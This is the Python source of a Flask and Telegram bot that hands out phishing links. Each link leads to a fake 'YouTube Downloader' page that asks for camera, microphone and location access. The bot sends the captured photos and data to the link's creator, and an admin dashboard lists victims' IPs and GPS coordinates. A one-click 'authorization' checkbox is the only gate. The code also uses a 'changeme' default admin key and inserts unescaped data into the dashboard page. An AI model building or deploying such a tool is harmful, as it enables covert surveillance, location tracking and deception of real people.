import os
import json
import hashlib
import time
import base64
import logging
from flask import Flask, request, jsonify, send_from_directory, abort
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Dispatcher, CommandHandler, CallbackQueryHandler
import requests

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_IDS_RAW = os.environ.get('ADMIN_IDS', '')
ADMIN_IDS = [int(x.strip()) for x in ADMIN_IDS_RAW.split(',') if x.strip()]
APP_URL = os.environ.get('APP_URL', '').rstrip('/')
ADMIN_API_KEY = os.environ.get('ADMIN_API_KEY', 'changeme')

bot = Bot(token=BOT_TOKEN)

DATA_DIR = '/tmp/bot_data'
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(os.path.join(DATA_DIR, 'photos'), exist_ok=True)

def get_links():
    path = os.path.join(DATA_DIR, 'links.json')
    if os.path.exists(path):
        with open(path, 'r') as f:
            return json.load(f)
    return {}

def save_links(data):
    path = os.path.join(DATA_DIR, 'links.json')
    with open(path, 'w') as f:
        json.dump(data, f)

def generate_link_id():
    h = hashlib.sha256(str(time.time()).encode() + os.urandom(16))
    return h.hexdigest()[:12]

# ============ TELEGRAM BOT HANDLERS ============

def start(update, context):
    user = update.effective_user
    welcome_text = (
        f"👋 **Welcome {user.first_name}!**\n\n"
        f"I'm your **Security Testing Assistant** 🔐\n\n"
        f"📌 This bot generates phishing simulation links for authorized\n"
        f"   penetration testing engagements.\n\n"
        f"👇 Click below to generate your phishing link"
    )
    keyboard = [[InlineKeyboardButton("🎣 Generate Phishing Link", callback_data="generate_link")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)

def generate_link_callback(update, context):
    query = update.callback_query
    query.answer()
    user = query.from_user
    link_id = generate_link_id()
    
    links = get_links()
    links[link_id] = {
        'creator_id': user.id,
        'creator_name': user.full_name,
        'creator_username': user.username,
        'created_at': time.time(),
        'captures': []
    }
    save_links(links)
    
    terms_text = (
        "📋 **Terms & Conditions**\n\n"
        "By proceeding, you confirm:\n\n"
        "✅ You have **written authorization** to test the target\n"
        "✅ This is for **security assessment** only\n"
        "✅ All data captured will be handled **responsibly**\n\n"
        "Do you accept these terms?"
    )
    keyboard = [
        [InlineKeyboardButton("✅ I Accept", callback_data=f"accept_{link_id}"),
         InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
    ]
    query.edit_message_text(terms_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

def accept_callback(update, context):
    query = update.callback_query
    query.answer()
    data = query.data
    link_id = data.replace('accept_', '')
    
    phishing_url = f"{APP_URL}/{link_id}"
    
    result_text = (
        "✅ **Terms Accepted!**\n\n"
        "Here's your phishing link:\n\n"
        f"🔗 `{phishing_url}`\n\n"
        "📋 **What this link does:**\n"
        "• Opens a fake \"YouTube Downloader\" verification page\n"
        "• Requests **Camera, Microphone, and Location** permissions\n"
        "• Sends captured data directly to you here\n\n"
        "👇 Generate another link"
    )
    keyboard = [[InlineKeyboardButton("🎣 Generate Another Link", callback_data="generate_link")]]
    query.edit_message_text(result_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

def cancel_callback(update, context):
    query = update.callback_query
    query.answer()
    query.edit_message_text("❌ Cancelled. Send /start to try again.")

def admin_panel(update, context):
    user = update.effective_user
    if user.id not in ADMIN_IDS:
        update.message.reply_text("⛔ Unauthorized.")
        return
    
    links = get_links()
    total_links = len(links)
    total_captures = sum(len(l.get('captures', [])) for l in links.values())
    
    text = f"🔐 **Admin Panel**\n\n📊 **Stats:**\n• Links: {total_links}\n• Captures: {total_captures}\n\n"
    keyboard = [
        [InlineKeyboardButton("📋 View Links", callback_data="admin_links")],
        [InlineKeyboardButton("📸 View Captures", callback_data="admin_captures")],
        [InlineKeyboardButton("🗑️ Clear All", callback_data="admin_clear")]
    ]
    update.message.reply_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

def admin_callback(update, context):
    query = update.callback_query
    query.answer()
    
    if query.from_user.id not in ADMIN_IDS:
        query.edit_message_text("⛔ Unauthorized.")
        return
    
    links = get_links()
    
    if query.data == "admin_links":
        if not links:
            query.edit_message_text("📋 No links yet.")
            return
        text = "**📋 All Links:**\n\n"
        for lid, ld in links.items():
            cc = len(ld.get('captures', []))
            ct = time.strftime('%Y-%m-%d %H:%M', time.localtime(ld['created_at']))
            text += f"🔗 `{lid}` — {cc} captures — {ct}\n  👤 {ld['creator_name']}\n\n"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]
        query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif query.data == "admin_captures":
        all_caps = []
        for lid, ld in links.items():
            for cap in ld.get('captures', []):
                cap['link_id'] = lid
                all_caps.append(cap)
        if not all_caps:
            query.edit_message_text("📸 No captures yet.")
            return
        text = f"**📸 Captures ({len(all_caps)}):**\n\n"
        for cap in all_caps[-5:]:
            ts = cap.get('timestamp', '?')[:19]
            ip = cap.get('ip', '?')
            cam = '✅' if cap.get('hasCamera') else '❌'
            mic = '✅' if cap.get('hasMic') else '❌'
            loc = '✅' if cap.get('hasLocation') else '❌'
            text += f"• {ts} | {ip} | 📸{cam} 🎙️{mic} 📍{loc}\n"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]
        query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif query.data == "admin_clear":
        if os.path.exists(os.path.join(DATA_DIR, 'links.json')):
            os.remove(os.path.join(DATA_DIR, 'links.json'))
        query.edit_message_text("🗑️ All data cleared.")
    
    elif query.data == "admin_back":
        links = get_links()
        total_links = len(links)
        total_captures = sum(len(l.get('captures', [])) for l in links.values())
        text = f"🔐 **Admin Panel**\n\n📊 **Stats:**\n• Links: {total_links}\n• Captures: {total_captures}\n\n"
        keyboard = [
            [InlineKeyboardButton("📋 View Links", callback_data="admin_links")],
            [InlineKeyboardButton("📸 View Captures", callback_data="admin_captures")],
            [InlineKeyboardButton("🗑️ Clear All", callback_data="admin_clear")]
        ]
        query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

# Setup dispatcher
dispatcher = Dispatcher(bot, None, use_context=True)
dispatcher.add_handler(CommandHandler('start', start))
dispatcher.add_handler(CommandHandler('admin', admin_panel))
dispatcher.add_handler(CallbackQueryHandler(generate_link_callback, pattern='^generate_link$'))
dispatcher.add_handler(CallbackQueryHandler(accept_callback, pattern='^accept_'))
dispatcher.add_handler(CallbackQueryHandler(cancel_callback, pattern='^cancel$'))
dispatcher.add_handler(CallbackQueryHandler(admin_callback, pattern='^admin_'))

# ============ SEND HELPER ============

def send_photo_to_chat(chat_id, photo_b64, caption):
    try:
        photo_bytes = base64.b64decode(photo_b64.split(',')[1] if ',' in photo_b64 else photo_b64)
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ('capture.jpg', photo_bytes, 'image/jpeg')}
        data = {'chat_id': chat_id, 'caption': caption, 'parse_mode': 'Markdown'}
        requests.post(url, files=files, data=data)
    except Exception as e:
        logger.error(f"Send photo error: {e}")

def send_text_to_chat(chat_id, text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'})
    except Exception as e:
        logger.error(f"Send text error: {e}")

# ============ FLASK ROUTES ============

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        update = Update.de_json(request.get_json(force=True), bot)
        dispatcher.process_update(update)
        return '', 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return 'error', 500

@app.route('/webhook', methods=['GET'])
def webhook_check():
    return 'Webhook active ✅', 200

@app.route('/admin', methods=['GET'])
@app.route('/admin/data', methods=['GET'])
def admin_dashboard():
    if request.path == '/admin/data':
        key = request.headers.get('X-Admin-Key', '')
        if key != ADMIN_API_KEY:
            return jsonify({'error': 'Unauthorized'}), 401
        
        links = get_links()
        all_caps = []
        for lid, ld in links.items():
            for cap in ld.get('captures', []):
                cap['link_id'] = lid
                cap['creator'] = ld.get('creator_name', 'Unknown')
                all_caps.append(cap)
        all_caps.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
        
        from datetime import datetime, timedelta
        cutoff = (datetime.now() - timedelta(hours=24)).isoformat()
        recent = sum(1 for c in all_caps if c.get('timestamp', '') >= cutoff)
        
        return jsonify({
            'total_links': len(links),
            'total_captures': len(all_caps),
            'recent_24h': recent,
            'captures': all_caps[:50]
        })
    
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Bot Admin</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin:0; padding:0; box-sizing:border-box; }
            body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#0f0f23; color:#e0e0e0; padding:20px; }
            .container { max-width:1200px; margin:0 auto; }
            h1 { color:#00ff88; margin-bottom:30px; border-bottom:2px solid #00ff88; padding-bottom:10px; }
            .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:20px; margin-bottom:30px; }
            .stat-card { background:#1a1a3e; border-radius:10px; padding:20px; text-align:center; border:1px solid #2a2a5e; }
            .stat-card .number { font-size:36px; font-weight:bold; color:#00ff88; }
            .stat-card .label { font-size:14px; color:#888; margin-top:5px; }
            table { width:100%; border-collapse:collapse; background:#1a1a3e; border-radius:10px; overflow:hidden; }
            th { background:#2a2a5e; padding:12px; text-align:left; color:#00ff88; }
            td { padding:12px; border-bottom:1px solid #2a2a5e; }
            .badge { display:inline-block; padding:3px 8px; border-radius:5px; font-size:12px; }
            .badge-green { background:#003300; color:#00ff00; }
            .badge-red { background:#330000; color:#ff0000; }
            .refresh { background:#00ff88; color:#0f0f23; border:none; padding:10px 20px; border-radius:5px; cursor:pointer; font-weight:bold; margin-bottom:20px; }
            .refresh:hover { background:#00cc6a; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔐 Admin Dashboard</h1>
            <button class="refresh" onclick="location.reload()">🔄 Refresh</button>
            <div class="stats" id="stats">Loading...</div>
            <h2 style="margin:15px 0;">📋 Captures</h2>
            <table>
                <thead><tr><th>Time</th><th>IP</th><th>Platform</th><th>Camera</th><th>Mic</th><th>Location</th><th>Coords</th></tr></thead>
                <tbody id="capturesBody"><tr><td colspan="7">Loading...</td></tr></tbody>
            </table>
        </div>
        <script>
        async function loadData(){
            const key = localStorage.getItem('ak') || prompt('Admin API Key:');
            if(key) localStorage.setItem('ak', key);
            const r = await fetch('/admin/data', {headers:{'X-Admin-Key':key}});
            const d = await r.json();
            document.getElementById('stats').innerHTML = `
                <div class="stat-card"><div class="number">${d.total_links}</div><div class="label">Total Links</div></div>
                <div class="stat-card"><div class="number">${d.total_captures}</div><div class="label">Captures</div></div>
                <div class="stat-card"><div class="number">${d.recent_24h}</div><div class="label">Last 24h</div></div>`;
            let html = '';
            (d.captures||[]).forEach(c => {
                const hl = c.latitude && c.longitude;
                html += `<tr><td>${(c.timestamp||'').substring(0,19)}</td>
                    <td>${c.ip||'?'}</td>
                    <td>${c.platform||'?'}</td>
                    <td><span class="badge ${c.hasCamera?'badge-green':'badge-red'}">${c.hasCamera?'✅':'❌'}</span></td>
                    <td><span class="badge ${c.hasMic?'badge-green':'badge-red'}">${c.hasMic?'✅':'❌'}</span></td>
                    <td><span class="badge ${c.hasLocation?'badge-green':'badge-red'}">${c.hasLocation?'✅':'❌'}</span></td>
                    <td>${hl?c.latitude+', '+c.longitude:'N/A'}</td></tr>`;
            });
            document.getElementById('capturesBody').innerHTML = html || '<tr><td colspan="7">No captures</td></tr>';
        }
        loadData();
        </script>
    </body>
    </html>
    """, 200

@app.route('/<path:path>', methods=['GET'])
def serve_page(path):
    # Check if it's a valid link ID (12 chars)
    links = get_links()
    if path in links:
        templates_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'templates')
        return send_from_directory(templates_dir, 'index.html')
    
    # Otherwise 404
    abort(404)

@app.route('/', methods=['GET'])
def home():
    return 'Bot is running ✅', 200
